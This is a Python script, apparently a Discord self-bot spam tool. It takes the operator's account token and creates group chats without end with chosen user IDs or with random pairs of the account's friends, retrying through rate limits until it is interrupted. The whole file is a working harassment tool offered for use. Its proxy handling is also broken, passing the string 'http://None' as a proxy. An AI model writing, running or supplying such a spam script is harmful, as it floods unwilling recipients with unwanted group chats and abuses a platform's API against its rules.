import requests
import random
from time import sleep
from pystyle import Colors, Colorate

def clear():
    print("\033c", end="")

def proxy():
    return None

def getheaders(token):
    return {
        "Authorization": token,
        "Content-Type": "application/json"
    }

def handle_error(message):
    print(f"{Colors.red}Error: {message}{Colors.reset}")

def set_title(title):
    print(f"\033]0;{title}\007")

def main():
    clear()
    print(f"{Colors.red}Returning to main menu...{Colors.reset}")

def selector(token, users):
    clear()
    while True:
        try:
            response = requests.post('https://discordapp.com/api/v9/users/@me/channels', proxies=proxy(), headers=getheaders(token), json={"recipients": users})

            if response.status_code in [200, 204]:
                print(f"{Colors.green}Created groupchat{Colors.reset}")
            elif response.status_code == 429:
                print(f"{Colors.red}Rate limited ({response.json().get('retry_after', 'N/A')}ms){Colors.reset}")
            else:
                handle_error(f"HTTP {response.status_code}")
        except Exception as e:
            handle_error(str(e))
        except KeyboardInterrupt:
            break
    main()

def randomizer(token, ID):
    while True:
        users = random.sample(ID, 2)
        try:
            response = requests.post('https://discordapp.com/api/v9/users/@me/channels', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json={"recipients": users})

            if response.status_code in [200, 204]:
                print(f"{Colors.green}Created groupchat{Colors.reset}")
            elif response.status_code == 429:
                print(f"{Colors.red}Rate limited ({response.json().get('retry_after', 'N/A')}ms){Colors.reset}")
            else:
                handle_error(f"HTTP {response.status_code}")
        except Exception as e:
            handle_error(str(e))
        except KeyboardInterrupt:
            break
    main()

clear()
token = input(f"{Colors.red}Your Account Token: {Colors.reset}")

print(f'\n{Colors.red}Do you want to choose user(s) yourself to groupchat spam or do you want to select randoms?{Colors.reset}')
print(f'''
[01] {Colors.green}Choose user(s) yourself{Colors.reset}
[02] {Colors.green}Randomize the users{Colors.reset}
                    ''')
try:
    secondchoice = int(input(f'{Colors.red}Choice: {Colors.reset}'))
except ValueError:
    handle_error("Invalid input. Please enter a number.")
    main()

if secondchoice not in [1, 2]:
    handle_error('Invalid Second Choice')
    main()

if secondchoice == 1:
    set_title("Creating groupchats")
    print(f'\n{Colors.red}Input the users you want to create a groupchat with (separate by , id,id2,id3){Colors.reset}')
    recipients = input(f'{Colors.red}Users ID: {Colors.reset}')
    user = recipients.split(',')
    if len(user) < 2:
        handle_error("You need to input at least two user IDs, separated by commas.")
        main()
    input(f'\n\n\n{Colors.red}Press enter to continue ("ctrl + c" at anytime to stop){Colors.reset}')
    selector(token, user)

elif secondchoice == 2:
    set_title("Creating groupchats")
    IDs = []
    try:
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'http://{proxy()}'}, headers=getheaders(token)).json()
        for friend in friendIds:
            IDs.append(friend['id'])
    except Exception as e:
        handle_error(f"Failed to get friend IDs: {str(e)}")
        main()
    input(f'{Colors.red}Press enter to continue ("ctrl + c" at anytime to stop){Colors.reset}')
    randomizer(token, IDs)

if __name__ == "__main__":
    main()
